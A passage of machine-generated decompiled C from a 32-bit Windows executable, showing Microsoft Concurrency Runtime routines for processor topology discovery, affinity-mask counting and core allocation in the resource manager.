  flOldProtect = (DWORD)this;
  if ( dword_4F0BF4 >= 3 )
    return (_BYTE *)__crtFlushProcessWriteBuffers(flOldProtect);
  result = (_BYTE *)this[35];
  if ( *result == 1 )
    return (_BYTE *)VirtualProtect(result, 1u, 2u, &flOldProtect);
  return result;
}
// 46BAEA: using guessed type int __cdecl __crtFlushProcessWriteBuffers(_DWORD);
// 4F0BF4: using guessed type int dword_4F0BF4;

//----- (00471AC7) --------------------------------------------------------
int sub_471AC7()
{
  int result; // eax

  result = dword_4F0BE4;
  if ( !dword_4F0BE4 )
  {
    sub_46FC8F(&dword_4F0C34);
    result = dword_4F0BE4;
    if ( !dword_4F0BE4 )
    {
      sub_4721FB(0);
      result = dword_4F0BE4;
    }
    dword_4F0C34 = 0;
  }
  return result;
}
// 4F0BE4: using guessed type int dword_4F0BE4;
// 4F0C34: using guessed type int dword_4F0C34;

//----- (00471B12) --------------------------------------------------------
int __thiscall sub_471B12(_DWORD *this, unsigned int *a2)
{
  int v3; // edx
  int v4; // eax
  int v5; // esi
  _DWORD *v6; // ecx
  unsigned int v7; // edx
  unsigned __int8 *v8; // edi
  int v10; // eax
  int v11; // edx
  _DWORD *v12; // ecx
  unsigned int v13; // esi
  unsigned __int8 *v14; // edi
  char pExceptionObject[12]; // [esp+Ch] [ebp-18h] BYREF
  int CurrentProcessorNumber; // [esp+18h] [ebp-Ch]
  int v17; // [esp+1Ch] [ebp-8h]
  unsigned __int16 v18; // [esp+20h] [ebp-4h] BYREF
  unsigned __int8 v19; // [esp+22h] [ebp-2h]

  if ( sub_473BB5() < 4 )
  {
    if ( sub_473BB5() != 2 && sub_473BB5() != 3 )
    {
      if ( dword_4F0BF4 != 1 )
      {
        std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
        _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVunsupported_os_Concurrency__);
      }
      if ( a2 )
        *a2 = 0;
      return 0;
    }
    CurrentProcessorNumber = __crtGetCurrentProcessorNumber();
    v10 = 1 << CurrentProcessorNumber;
    v11 = 0;
    v12 = (_DWORD *)this[18];
    v17 = 1 << CurrentProcessorNumber;
    while ( 1 )
    {
      if ( (v10 & *v12) != 0 )
      {
        v13 = 0;
        if ( v12[1] )
        {
          v14 = (unsigned __int8 *)(v12[8] + 8);
          do
          {
            if ( *v14 == CurrentProcessorNumber )
            {
              if ( a2 )
                *a2 = v13;
              return v11;
            }
            ++v13;
            v14 += 36;
          }
          while ( v13 < v12[1] );
          v10 = v17;
        }
      }
      ++v11;
      v12 += 10;
    }
  }
  sub_46F5C3((int)&v18);
  v3 = v18;
  v4 = 1 << v19;
  v5 = 0;
  v17 = v19;
  v6 = (_DWORD *)this[18];
  CurrentProcessorNumber = 1 << v19;
  while ( v6[3] != v3 || (v4 & *v6) == 0 )
  {
LABEL_11:
    ++v5;
    v6 += 10;
  }
  v7 = 0;
  if ( !v6[1] )
  {
LABEL_10:
    v3 = v18;
    goto LABEL_11;
  }
  v8 = (unsigned __int8 *)(v6[8] + 8);
  while ( *v8 != v17 )
  {
    ++v7;
    v8 += 36;
    if ( v7 >= v6[1] )
    {
      v4 = CurrentProcessorNumber;
      goto LABEL_10;
    }
  }
  if ( a2 )
    *a2 = v7;
  return v5;
}
// 46BB2A: using guessed type int __crtGetCurrentProcessorNumber(void);
// 4778F1: using guessed type _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this);
// 4F0BF4: using guessed type int dword_4F0BF4;

//----- (00471C20) --------------------------------------------------------
int __thiscall sub_471C20(_DWORD *this)
{
  return *(_DWORD *)(this[1] + 4);
}

//----- (00471C27) --------------------------------------------------------
int __thiscall sub_471C27(_DWORD *this)
{
  return *(_DWORD *)(*(_DWORD *)(this[1] + 32) + 32);
}

//----- (00471C31) --------------------------------------------------------
int __thiscall sub_471C31(_DWORD *this)
{
  return *(_DWORD *)(this[18] + 36);
}

//----- (00471C38) --------------------------------------------------------
int __thiscall sub_471C38(_DWORD *this)
{
  return *(_DWORD *)(this[1] + 16);
}

//----- (00471C3F) --------------------------------------------------------
int __thiscall sub_471C3F(int *this)
{
  int v1; // eax

  v1 = sub_471C6D(*(_DWORD **)(this[1] + 12), this[1]);
  if ( v1 )
    return *(_DWORD *)(v1 + 32);
  else
    return 0;
}

//----- (00471C56) --------------------------------------------------------
int __thiscall sub_471C56(int *this)
{
  int v1; // eax

  v1 = sub_471C92(*(_DWORD **)(this[1] + 24), this[1]);
  if ( v1 )
    return *(_DWORD *)(v1 + 36);
  else
    return 0;
}

//----- (00471C6D) --------------------------------------------------------
int __thiscall sub_471C6D(_DWORD *this, int a2)
{
  unsigned int v2; // eax

  v2 = (a2 - this[8]) / 36 + 1;
  if ( v2 >= this[1] )
    return 0;
  else
    return this[8] + 36 * v2;
}

//----- (00471C92) --------------------------------------------------------
int __thiscall sub_471C92(_DWORD *this, int a2)
{
  unsigned int v2; // eax

  v2 = (a2 - this[18]) / 40 + 1;
  if ( v2 >= this[6] )
    return 0;
  else
    return this[18] + 40 * v2;
}

//----- (00471CB7) --------------------------------------------------------
int sub_471CB7()
{
  int result; // eax

  result = dword_4F0BEC;
  if ( !dword_4F0BEC )
  {
    sub_46FC8F(&dword_4F0C34);
    result = dword_4F0BEC;
    if ( !dword_4F0BEC )
    {
      sub_4721FB(0);
      result = dword_4F0BEC;
    }
    dword_4F0C34 = 0;
  }
  return result;
}
// 4F0BEC: using guessed type int dword_4F0BEC;
// 4F0C34: using guessed type int dword_4F0C34;

//----- (00471D02) --------------------------------------------------------
int __thiscall sub_471D02(_DWORD *this)
{
  return *(_DWORD *)(this[1] + 20);
}

//----- (00471D25) --------------------------------------------------------
void *__cdecl sub_471D25(int a1)
{
  void *result; // eax

  if ( dword_4F0BF4 < 4 )
    result = sub_46F5E5((PDWORD)&dword_4F0BF8);
  else
    result = sub_46F66C(a1, (size_t *)&dword_4F0BF8);
  Block = result;
  return result;
}
// 4F0BF4: using guessed type int dword_4F0BF4;
// 4F0BF8: using guessed type int dword_4F0BF8;

//----- (00471D4E) --------------------------------------------------------
unsigned int __thiscall sub_471D4E(_DWORD *this, _DWORD *a2, int a3)
{
  _DWORD *v3; // edx
  unsigned int result; // eax
  int v5; // ecx
  _DWORD *v6; // esi
  unsigned int v7; // ebx
  int v8; // eax
  int v9; // edi
  _DWORD *v10; // eax
  int v11; // ecx
  int v12; // ecx
  unsigned int v13; // [esp+8h] [ebp-18h]
  int v14; // [esp+10h] [ebp-10h]
  int v15; // [esp+14h] [ebp-Ch]
  int v17; // [esp+1Ch] [ebp-4h]

  v3 = this;
  result = 0;
  v13 = 0;
  if ( this[6] )
  {
    v5 = 0;
    v6 = (_DWORD *)(a2[4] + 44);
    v17 = 0;
    do
    {
      if ( *(v6 - 3) )
      {
        v7 = 0;
        if ( *(v6 - 10) )
        {
          v15 = 0;
          v8 = 0;
          v14 = 0;
          do
          {
            v9 = v8 + v6[1];
            if ( *(_DWORD *)v9 == 4 && *(_BYTE *)(v9 + 49) )
            {
              v10 = (_DWORD *)(v15 + *(_DWORD *)(v5 + v3[18] + 32));
              v11 = v10[4];
              if ( v11 == 1 )
              {
                sub_47B789(a2, (int)(v6 - 11), v7);
                v3 = this;
                v5 = v17;
                if ( *(_BYTE *)(v9 + 48) )
                {
                  --*v6;
                  --*(_DWORD *)(a3 + 24);
                }
              }
              else
              {
                if ( v11 - v10[7] > (unsigned int)(*(_BYTE *)(v9 + 48) == 0) )
                {
                  v10[4] = v11 - 1;
                  v12 = (int)(v6 - 11);
                  if ( *(_BYTE *)(v9 + 48) )
                  {
                    sub_473B4C(v3, (int)(v6 - 11), v9, (_DWORD *)(v17 + v3[18]), v10, a3);
                    v12 = (int)(v6 - 11);
                  }
                  sub_47B568(a2, v12, v7);
                  v3 = this;
                }
                v5 = v17;
              }
            }
            v14 += 52;
            ++v7;
            v15 += 36;
            v8 = v14;
          }
          while ( v7 < *(v6 - 10) );
          result = v13;
        }
      }
      ++result;
      v5 += 40;
      v6 += 13;
      v13 = result;
      v17 = v5;
    }
    while ( result < v3[6] );
  }
  return result;
}

//----- (00471E6B) --------------------------------------------------------
unsigned int __thiscall sub_471E6B(_DWORD *this, _DWORD *a2, int a3)
{
  int v3; // esi
  unsigned int v4; // eax
  int v5; // edi
  unsigned int v6; // esi
  unsigned int result; // eax
  unsigned int v8; // edx
  _DWORD *v9; // edi
  unsigned int v10; // ecx
  int v11; // edx
  int v12; // ecx
  _DWORD *v13; // edx
  int v14; // edx
  _DWORD *v15; // [esp+10h] [ebp-1Ch]
  unsigned int v16; // [esp+14h] [ebp-18h]
  int v17; // [esp+18h] [ebp-14h]
  int v18; // [esp+1Ch] [ebp-10h]
  int v19; // [esp+20h] [ebp-Ch]
  unsigned int v21; // [esp+28h] [ebp-4h]

  v3 = a2[40];
  v4 = sub_472427(a2);
  v5 = v3 - a2[42];
  v6 = v3 - *(_DWORD *)(a3 + 36) - *(_DWORD *)(a3 + 24);
  result = v5 - (a2[46] + v4);
  if ( v6 >= result )
  {
    result = a2[46] + sub_472427(a2);
    v6 = v5 - result;
  }
  v8 = 0;
  v16 = 0;
  if ( !v6 )
    return result;
  v19 = 0;
  v9 = (_DWORD *)(a2[4] + 36);
  do
  {
    result = (unsigned int)this;
    if ( v8 >= this[6] )
      return result;
    result = *(v9 - 2) - *v9;
    if ( !result )
      goto LABEL_20;
    v10 = 0;
    v18 = 0;
    v21 = 0;
    v11 = 0;
    result = 0;
    v17 = 0;
    while ( v10 < *(v9 - 8) )
    {
      v12 = v11 + v9[3];
      if ( *(_DWORD *)v12 != 4 || *(_DWORD *)(v12 + 40) )
        goto LABEL_18;
      if ( !*(_BYTE *)(v12 + 49) )
      {
        result = v21;
        v13 = (_DWORD *)(v21 + *(_DWORD *)(this[18] + v19 + 32));
        v15 = v13;
        if ( v13[4] <= 1u )
        {
          v11 = v17;
          goto LABEL_18;
        }
        --v13[4];
        v14 = (int)(v9 - 9);
        if ( *(_BYTE *)(v12 + 48) )
        {
          sub_473B4C(this, (int)(v9 - 9), v12, (_DWORD *)(v19 + this[18]), v15, a3);
          v14 = (int)(v9 - 9);
        }
        sub_47B568(a2, v14, v18);
        v11 = v17;
        --v6;
      }
      result = v21;
LABEL_18:
      v11 += 52;
      v10 = v18 + 1;
      v17 = v11;
      result += 36;
      ++v18;
      v21 = result;
      if ( !v6 )
        break;
    }
    v8 = v16;
LABEL_20:
    v19 += 40;
    ++v8;
    v9 += 13;
    v16 = v8;
  }
  while ( v6 );
  return result;
}
// 471EED: conditional instruction was optimized away because esi.4!=0

//----- (00471FB3) --------------------------------------------------------
void __thiscall sub_471FB3(_DWORD *this)
{
  unsigned int i; // esi
  int v3; // ebx
  unsigned int v4; // eax

  for ( i = 0; i < this[2]; ++i )
  {
    v3 = *(_DWORD *)(this[21] + 4 * i);
    if ( *(_BYTE *)(v3 + 33) == 1 )
    {
      v4 = sub_4707A1(*(_DWORD **)(v3 + 16));
      *(_DWORD *)(v3 + 36) = sub_47AB43(*(_DWORD **)(v3 + 16), v4);
    }
  }
}

//----- (00471FE9) --------------------------------------------------------
char __thiscall sub_471FE9(int this, int a2, int a3, char a4)
{
  _DWORD *v5; // eax
  char result; // al

  v5 = operator new(8u);
  if ( v5 )
  {
    *v5 = &Concurrency::details::GlobalCore::TopologyObject::`vftable';
    v5[1] = this;
  }
  else
  {
    v5 = 0;
  }
  *(_DWORD *)(this + 32) = v5;
  *(_DWORD *)(this + 12) = a2;
  *(_DWORD *)(this + 4) = a3;
  result = a4;
  *(_BYTE *)(this + 8) = a4;
  return result;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4C0974: using guessed type void *Concurrency::details::GlobalCore::TopologyObject::`vftable';

//----- (00472026) --------------------------------------------------------
unsigned int __thiscall sub_472026(
        unsigned int *this,
        unsigned int a2,
        unsigned __int16 a3,
        unsigned __int16 a4,
        unsigned int a5,
        unsigned int a6,
        char a7)
{
  _DWORD *v8; // eax
  int v9; // ebx
  signed int v10; // ecx
  unsigned __int16 v11; // dx
  unsigned int v12; // eax
  unsigned int v13; // edi
  int v14; // ecx
  unsigned int *v15; // eax
  void *v16; // ecx
  size_t v17; // eax
  unsigned int result; // eax
  unsigned int v19; // edx
  int v20; // edi
  unsigned int v21; // ecx
  int v22; // eax
  int v23; // ecx
  char v24; // [esp-4h] [ebp-1Ch]
  unsigned int v25; // [esp+10h] [ebp-8h]
  unsigned int v26; // [esp+14h] [ebp-4h]

  v8 = operator new(8u);
  v9 = 0;
  if ( v8 )
  {
    *v8 = &Concurrency::details::GlobalNode::TopologyObject::`vftable';
    v8[1] = this;
  }
  else
  {
    v8 = 0;
  }
  this[9] = (unsigned int)v8;
  this[6] = a2;
  this[4] = a3;
  this[3] = a4;
  v26 = a5;
  *this = a5;
  if ( a6 )
  {
    v12 = a6;
  }
  else
  {
    v10 = a5;
    v11 = 0;
    if ( a5 )
    {
      do
      {
        ++v11;
        v10 &= v10 - 1;
      }
      while ( v10 );
    }
    v12 = v11;
  }
  this[1] = v12;
  v13 = v12;
  this[2] = 0;
  v14 = (36 * (unsigned __int64)v12) >> 32 != 0 ? -1 : 36 * v12;
  v15 = (unsigned int *)unknown_libname_28(__CFADD__(v14, 4) ? -1 : v14 + 4);
  if ( v15 )
  {
    *v15 = v13;
    v16 = v15 + 1;
  }
  else
  {
    v16 = 0;
  }
  v17 = 36 * this[1];
  this[8] = (unsigned int)v16;
  result = (unsigned int)memset(v16, 0, v17);
  v19 = 0;
  if ( this[1] )
  {
    result = a5;
    v20 = 0;
    v21 = a6;
    while ( !v21 )
    {
      if ( (result & 1) != 0 )
      {
        v22 = this[3];
        v24 = v9;
LABEL_18:
        v23 = v20 + this[8];
        v20 += 36;
        v25 = v19 + 1;
        sub_471FE9(v23, (int)this, v9 + (v22 << 8), v24);
        v21 = a6;
        v19 = v25;
        result = v26;
      }
      result >>= 1;
      ++v9;
      v26 = result;
      if ( v19 >= this[1] )
        return result;
    }
    v24 = v9 + a7;
    v22 = a3 + (this[3] << 8);
    goto LABEL_18;
  }
  return result;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 46D404: using guessed type int __cdecl unknown_libname_28(_DWORD);
// 4C0980: using guessed type void *Concurrency::details::GlobalNode::TopologyObject::`vftable';

//----- (00472139) --------------------------------------------------------
void *__thiscall sub_472139(int this)
{
  unsigned int v2; // eax
  void *result; // eax
  void *v4; // [esp-8h] [ebp-10h]

  v2 = *(_DWORD *)(this + 12);
  if ( v2 < *(_DWORD *)(this + 8) )
  {
    do
      v2 *= 2;
    while ( v2 < *(_DWORD *)(this + 8) );
    v4 = *(void **)(this + 84);
    *(_DWORD *)(this + 12) = v2;
    j_j_j___free_base(v4);
    j_j_j___free_base(*(void **)(this + 88));
    j_j_j___free_base(*(void **)(this + 92));
    *(_DWORD *)(this + 84) = unknown_libname_28(
                               (unsigned __int64)*(unsigned int *)(this + 12) >> 30 != 0
                             ? -1
                             : 4 * *(_DWORD *)(this + 12));
    if ( *(_DWORD *)(this + 88) )
    {
      *(_DWORD *)(this + 88) = unknown_libname_28(
                                 (unsigned __int64)*(unsigned int *)(this + 12) >> 30 != 0
                               ? -1
                               : 4 * *(_DWORD *)(this + 12));
      *(_DWORD *)(this + 92) = unknown_libname_28(
                                 (unsigned __int64)*(unsigned int *)(this + 12) >> 30 != 0
                               ? -1
                               : 4 * *(_DWORD *)(this + 12));
    }
  }
  result = memset(*(void **)(this + 84), 0, 4 * *(_DWORD *)(this + 8));
  if ( *(_DWORD *)(this + 88) )
  {
    memset(*(void **)(this + 88), 0, 4 * *(_DWORD *)(this + 8));
    return memset(*(void **)(this + 92), 0, 4 * *(_DWORD *)(this + 8));
  }
  return result;
}
// 46D404: using guessed type int __cdecl unknown_libname_28(_DWORD);

//----- (004721FB) --------------------------------------------------------
void __cdecl sub_4721FB(char a1)
{
  int v1; // eax
  int v2; // ecx
  int *v3; // edi
  unsigned int v4; // esi
  unsigned int v5; // ecx
  int v6; // edx
  unsigned int v7; // ebx
  int v8; // eax
  int *v9; // ebx
  int v10; // ecx
  unsigned __int16 v11; // dx
  int *v12; // esi
  unsigned int v13; // eax
  int v14; // ecx
  unsigned int v15; // ebx
  unsigned int v16; // edi
  int v17; // ecx
  unsigned __int16 v18; // dx
  ULONG_PTR v19; // ecx
  unsigned __int16 i; // dx
  unsigned int v21; // [esp+0h] [ebp-10h]
  int v22; // [esp+4h] [ebp-Ch]
  int v23; // [esp+4h] [ebp-Ch]
  unsigned int v24; // [esp+8h] [ebp-8h]
  int v25; // [esp+8h] [ebp-8h]
  unsigned int v26; // [esp+Ch] [ebp-4h]
  unsigned int v27; // [esp+Ch] [ebp-4h]

  v1 = dword_4F0BF4;
  if ( !dword_4F0BF4 )
  {
    sub_4734B5();
    v1 = dword_4F0BF4;
  }
  v2 = dword_4F0BDC;
  if ( !dword_4F0BDC )
  {
    sub_470207();
    v1 = dword_4F0BF4;
    v2 = dword_4F0BDC;
  }
  if ( v1 >= 4 )
  {
    sub_471D25(0xFFFF);
    v3 = (int *)Block;
    v4 = 0;
    v5 = 0;
    v24 = 0;
    v6 = 0;
    v26 = 0;
    v7 = 0;
    v22 = 0;
    v21 = 0;
    if ( dword_4F0BF8 )
    {
      do
      {
        v8 = *v3;
        if ( *v3 == 3 )
        {
          v25 = 0;
          v9 = v3 + 8;
          do
          {
            sub_4701CE(v9);
            v10 = *v9;
            if ( *v9 )
            {
              ++v4;
              v11 = 0;
              do
              {
                ++v11;
                v10 &= v10 - 1;
              }
              while ( v10 );
              v22 += v11;
            }
            v9 += 3;
            ++v25;
          }
          while ( v25 < *((unsigned __int16 *)v3 + 15) );
          v8 = *v3;
          v7 = v21;
          v5 = v26;
          v24 = v4;
        }
        if ( v8 == 1 )
        {
          sub_4701CE(v3 + 8);
          v4 = v24;
          v5 = v26;
          if ( v3[8] )
            v21 = ++v7;
        }
        v5 += v3[1];
        v3 = (int *)((char *)v3 + v3[1]);
        v26 = v5;
      }
      while ( v5 < dword_4F0BF8 );
      v6 = v22;
    }
    byte_4F0BE8 = v4 > v7;
    if ( v4 <= v7 )
      v4 = v7;
    dword_4F0BEC = v4;
    dword_4F0BE4 = v6;
    dword_4F0BF0 = v7;
LABEL_39:
    if ( !a1 )
      sub_47032C();
    goto LABEL_47;
  }
  if ( v1 == 3 )
  {
    sub_471D25(0xFFFF);
    v12 = (int *)Block;
    v13 = 0;
    v14 = 0;
    v27 = 0;
    v15 = 0;
    v23 = 0;
    v16 = 0;
    if ( dword_4F0BF8 )
    {
      do
      {
        if ( v12[1] == 3 )
        {
          sub_4701A3(v12);
          v17 = *v12;
          if ( *v12 )
          {
            ++v15;
            v18 = 0;
            do
            {
              ++v18;
              v17 &= v17 - 1;
            }
            while ( v17 );
            v23 += v18;
          }
          v13 = v27;
        }
        if ( v12[1] == 1 )
        {
          sub_4701A3(v12);
          v13 = v27;
          if ( *v12 )
            ++v16;
        }
        v13 += 24;
        v12 += 6;
        v27 = v13;
      }
      while ( v13 < dword_4F0BF8 );
      v14 = v23;
    }
    byte_4F0BE8 = v15 > v16;
    if ( v15 <= v16 )
      v15 = v16;
    dword_4F0BEC = v15;
    dword_4F0BE4 = v14;
    dword_4F0BF0 = v16;
    goto LABEL_39;
  }
  byte_4F0BE8 = 0;
  dword_4F0BEC = 1;
  if ( v2 )
  {
    sub_470207();
    v19 = *(_DWORD *)sub_471A63((_DWORD *)dword_4F0BDC, 0) & ProcessAffinityMask;
  }
  else
  {
    v19 = ProcessAffinityMask;
  }
  for ( i = 0; v19; v19 &= v19 - 1 )
    ++i;
  dword_4F0BE4 = i;
  dword_4F0BF0 = 1;
LABEL_47:
  if ( dword_4F0BE0 )
    sub_47004E((void **)dword_4F0BE0, 1);
  dword_4F0BE0 = 0;
}
// 4F0BDC: using guessed type int dword_4F0BDC;
// 4F0BE0: using guessed type int dword_4F0BE0;
// 4F0BE4: using guessed type int dword_4F0BE4;
// 4F0BE8: using guessed type char byte_4F0BE8;
// 4F0BEC: using guessed type int dword_4F0BEC;
// 4F0BF0: using guessed type int dword_4F0BF0;
// 4F0BF4: using guessed type int dword_4F0BF4;
// 4F0BF8: using guessed type int dword_4F0BF8;

//----- (00472427) --------------------------------------------------------
unsigned int __thiscall sub_472427(_DWORD *this)
{
  unsigned int result; // eax
  unsigned int v2; // ecx

  result = this[43] - this[46];
  v2 = this[33];
  if ( result <= v2 )
    return v2;
  return result;
}

//----- (00472440) --------------------------------------------------------
_DWORD *__thiscall sub_472440(unsigned int *this, _DWORD *a2, int a3, char a4)
{
  unsigned int v5; // ebx
  unsigned int v6; // ecx
  BOOL v7; // eax
  _DWORD *v8; // ebx
  unsigned int v10; // [esp+Ch] [ebp-14h]
  unsigned int v11; // [esp+10h] [ebp-10h]
  unsigned int v12; // [esp+14h] [ebp-Ch]
  unsigned int v13; // [esp+18h] [ebp-8h]
  char v14; // [esp+1Fh] [ebp-1h]

  if ( (_BYTE)a3 )
    a2[4] = sub_4704A4(this);
  v5 = 0;
  v10 = a2[40];
  if ( a4 )
  {
    v11 = sub_470477(a2);
    v6 = sub_470454(a2);
    v13 = v6;
    if ( (_BYTE)a3 )
    {
      v7 = v11;
    }
    else
    {
      v6 = a2[46] + sub_472427(a2) < this[7];
      v13 = v6;
      v7 = v10 < v11;
    }
    v12 = v7;
  }
  else
  {
    v11 = a2[46] + sub_472427(a2);
    v12 = v11;
    v6 = sub_4707A1(a2);
    v13 = v6;
  }
  v14 = 0;
  if ( v6 )
  {
    sub_473957(this, (int)a2, a4);
    sub_472836(this);
    v5 = sub_473283(this, (int)a2, v13, 0);
    if ( v5 < v13 && ((_BYTE)a3 || v12) )
    {
      v14 = 1;
      v5 += sub_472F44(this, (int)a2, v13 - v5, 0xFFFFFFFE);
      if ( v5 < v13 )
      {
        v5 += sub_472A77(this, (int)a2, v5 + v10, v11, v10 + v13);
        if ( v5 < v12 )
        {
          v5 += sub_472F44(this, (int)a2, v12 - v5, 0xFFFFFFFF);
          if ( v5 < v12 )
            v5 += sub_47324F(this, (int)a2, v12 - v5);
        }
      }
    }
    sub_47345E(this);
  }
  v8 = sub_47B0DC((int)a2, v5, a3, a4);
  if ( v14 )
    sub_470347(this, (int)a2);
  return v8;
}

//----- (00472596) --------------------------------------------------------
int __thiscall sub_472596(_DWORD *this, int a2, int a3, int a4)
{
  int result; // eax
  int v5; // esi
  unsigned int v6; // ebx
  _DWORD *v7; // esi
  unsigned int v8; // ecx
  int v9; // edx
  bool v10; // zf
  int v11; // [esp+8h] [ebp-18h]
  unsigned int v12; // [esp+Ch] [ebp-14h]
  _DWORD *v13; // [esp+10h] [ebp-10h]
  int v14; // [esp+14h] [ebp-Ch]
  int v15; // [esp+18h] [ebp-8h]
  unsigned int v16; // [esp+1Ch] [ebp-4h]

  v13 = this;
  *(_DWORD *)a4 = a2;
  result = a3;
  *(double *)(a4 + 8) = 0.0;
  *(_DWORD *)(a4 + 16) = a3;
  v5 = *(_DWORD *)(a3 + 16);
  if ( v5 )
  {
    v6 = 0;
    v12 = 0;
    if ( this[6] )
    {
      result = 0;
      v7 = (_DWORD *)(v5 + 44);
      v11 = 0;
      do
      {
        *(v7 - 1) = 0;
        *v7 = 0;
        if ( *(v7 - 4) )
        {
          v16 = 0;
          if ( *(v7 - 10) )
          {
            v8 = 0;
            v14 = 0;
            v15 = 0;
            do
            {
              v9 = v15 + v7[1];
              v10 = *(_DWORD *)v9 == 4;
              *(_BYTE *)(v9 + 48) = 0;
              if ( v10 && !*(_DWORD *)(v9 + 24) )
              {
                sub_473B4C(
                  v13,
                  (int)(v7 - 11),
                  v9,
                  (_DWORD *)(result + v13[18]),
                  (_DWORD *)(v14 + *(_DWORD *)(result + v13[18] + 32)),
                  a4);
                result = v11;
                v8 = v16;
              }
              v15 += 52;
              ++v8;
              v14 += 36;
              v16 = v8;
            }
            while ( v8 < *(v7 - 10) );
            v6 = v12;
            this = v13;
          }
        }
        ++v6;
        result += 40;
        v7 += 13;
        v12 = v6;
        v11 = result;
      }
      while ( v6 < this[6] );
    }
  }
  return result;
}

//----- (0047265C) --------------------------------------------------------
_DWORD *__thiscall sub_47265C(_DWORD *this)
{
  _DWORD *v1; // edi
  int v2; // esi
  _DWORD *result; // eax
  int v4; // ebx
  bool v5; // zf
  int v6; // edi
  unsigned int v7; // eax
  unsigned int v8; // eax
  unsigned int v9; // esi
  char v10; // al
  unsigned int v12; // [esp+10h] [ebp-14h]
  int v13; // [esp+14h] [ebp-10h]
  unsigned int v14; // [esp+18h] [ebp-Ch] BYREF
  int v15; // [esp+1Ch] [ebp-8h] BYREF
  unsigned int v16; // [esp+20h] [ebp-4h] BYREF

  v1 = this;
  v2 = 0;
  v13 = 0;
  result = sub_472139((int)this);
  v4 = v1[25];
  v5 = v4 == 0;
  while ( 1 )
  {
    v4 = v5 ? 0 : *(_DWORD *)(v4 + 24);
    if ( !v4 )
      return result;
    memset((void *)(v4 + 64), 0, 0x38u);
    sub_472596(v1, v2, v4, v4 + 64);
    v12 = *(_DWORD *)(v4 + 160);
    if ( *(_BYTE *)(v4 + 204) )
    {
      v6 = *(_DWORD *)(v4 + 8);
      v7 = *(_DWORD *)(v4 + 120);
      v14 = 0;
      v15 = 0;
      v16 = v7;
      (*(void (__thiscall **)(int, unsigned int *, int *, unsigned int *))(*(_DWORD *)v6 + 4))(v6, &v14, &v15, &v16);
      v8 = sub_47A46F(*(_DWORD *)(v4 + 56), v12, v14, v15, v16);
      *(_DWORD *)(v4 + 100) = v8;
      if ( v8 > *(_DWORD *)(v4 + 160) )
        *(_DWORD *)(v4 + 100) = sub_47AB43((_DWORD *)v4, v8);
      v1 = this;
      *(_DWORD *)(v4 + 120) = v16;
    }
    else
    {
      *(_DWORD *)(v4 + 100) = *(_DWORD *)(v4 + 160);
    }
    v9 = *(_DWORD *)(v4 + 160);
    if ( v9 )
    {
      if ( *(_DWORD *)(v4 + 84) )
        goto LABEL_9;
    }
    else if ( !*(_DWORD *)(v4 + 196) )
    {
      goto LABEL_9;
    }
    if ( v9 > *(_DWORD *)(v4 + 100) || v9 >= sub_4707A1((_DWORD *)v4) )
    {
LABEL_9:
      v10 = 0;
      goto LABEL_10;
    }
    v10 = 1;
LABEL_10:
    *(_BYTE *)(v4 + 97) = v10;
    result = (_DWORD *)v1[21];
    result[v13] = v4 + 64;
    v2 = v13 + 1;
    v5 = v4 == v1[25];
    ++v13;
  }
}

//----- (0047276F) --------------------------------------------------------
void __fastcall sub_47276F(_DWORD *a1)
{
  unsigned int v1; // ebx
  int v2; // eax
  _DWORD *v3; // edi
  int v4; // esi
  unsigned int v5; // eax
  unsigned int v6; // ecx
  unsigned int v7; // eax
  unsigned int v8; // [esp+4h] [ebp-8h]
  unsigned int v9; // [esp+4h] [ebp-8h]
  _DWORD *i; // [esp+8h] [ebp-4h]

  v1 = 0;
  for ( i = a1; v1 < i[2]; ++v1 )
  {
    v2 = a1[21];
    v3 = *(_DWORD **)(v2 + 4 * v1);
    v4 = v3[4];
    if ( *(_DWORD *)(v4 + 168) )
      sub_471D4E(a1, (_DWORD *)v4, *(_DWORD *)(v2 + 4 * v1));
    if ( v3[5] )
    {
      v8 = *(_DWORD *)(v4 + 160) - v3[5];
      if ( v3[9] > v8 )
      {
        v5 = sub_472427((_DWORD *)v4);
        v6 = v8;
        if ( *(_DWORD *)(v4 + 184) + v5 > v8 )
          v6 = *(_DWORD *)(v4 + 184) + sub_472427((_DWORD *)v4);
        v3[9] = v6;
      }
    }
    v9 = *(_DWORD *)(v4 + 160);
    if ( v3[9] < v9 && v9 - *(_DWORD *)(v4 + 168) > *(_DWORD *)(v4 + 184) + sub_472427((_DWORD *)v4) )
      sub_471E6B(i, (_DWORD *)v4, (int)v3);
    if ( !*(_BYTE *)(v4 + 204) )
    {
      v7 = *(_DWORD *)(v4 + 160);
      if ( v3[9] > v7 )
        v3[9] = v7;
    }
    a1 = i;
  }
}

//----- (00472836) --------------------------------------------------------
unsigned int __thiscall sub_472836(_DWORD *this)
{
  unsigned int i; // esi
  unsigned int result; // eax
  _DWORD *v4; // ecx

  for ( i = 0; i < this[2]; ++i )
  {
    result = *(_DWORD *)(this[21] + 4 * i);
    v4 = *(_DWORD **)(result + 16);
    if ( v4[42] )
      result = sub_471D4E(this, v4, *(_DWORD *)(this[21] + 4 * i));
  }
  return result;
}

//----- (00472865) --------------------------------------------------------
unsigned int __thiscall sub_472865(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // esi
  unsigned int v4; // ecx
  int v5; // edx
  int v6; // ebx
  int v7; // eax
  unsigned int v8; // ecx
  int v9; // eax
  unsigned int v10; // ebx
  _DWORD *v11; // edx
  int v12; // eax
  int v13; // edx
  int v14; // ebx
  unsigned int v15; // ebx
  unsigned int v16; // edx
  int v17; // ebx
  unsigned int v18; // eax
  int v19; // ecx
  int v20; // edx
  int v21; // ecx
  int v22; // eax
  int v23; // edx
  int v24; // eax
  unsigned int v25; // edx
  int v26; // esi
  unsigned int v27; // eax
  unsigned int v28; // ecx
  int v29; // ebx
  unsigned int v30; // edi
  int v31; // edx
  unsigned int v32; // eax
  unsigned int v33; // eax
  bool v34; // zf
  unsigned int j; // [esp+Ch] [ebp-2Ch]
  unsigned int v37; // [esp+10h] [ebp-28h]
  int v38; // [esp+14h] [ebp-24h]
  unsigned int v39; // [esp+18h] [ebp-20h]
  unsigned int v40; // [esp+20h] [ebp-18h]
  unsigned int v41; // [esp+24h] [ebp-14h]
  _DWORD *i; // [esp+28h] [ebp-10h]
  unsigned int v43; // [esp+2Ch] [ebp-Ch]
  int v44; // [esp+30h] [ebp-8h]
